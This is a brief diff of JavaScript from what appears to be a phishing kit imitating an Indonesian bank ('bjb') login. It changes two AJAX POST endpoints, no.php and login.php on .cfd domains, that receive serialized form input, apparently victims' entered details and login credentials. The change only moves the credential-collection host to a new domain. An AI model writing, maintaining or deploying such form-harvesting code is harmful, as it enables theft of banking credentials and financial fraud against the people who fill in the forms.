@@ -9,7 +9,7 @@ $('.load').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://choreoapps.xx-dets.cfd/bjb/no.php',
+            url: 'https://choreodev.ib-wecb.cfd/bjb/no.php',
             data: $(this).serialize(),
             datatype: 'JSON',           
             complete: function(data) {
@@ -31,7 +31,7 @@ $('.load').fadeIn();
  document.getElementById('kirims').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreoapps.xx-dets.cfd/bjb/login.php',
+            url: 'https://choreodev.ib-wecb.cfd/bjb/login.php',
             data: $(this).serialize(),
             datatype: 'JSON',           
             complete: function(data) {
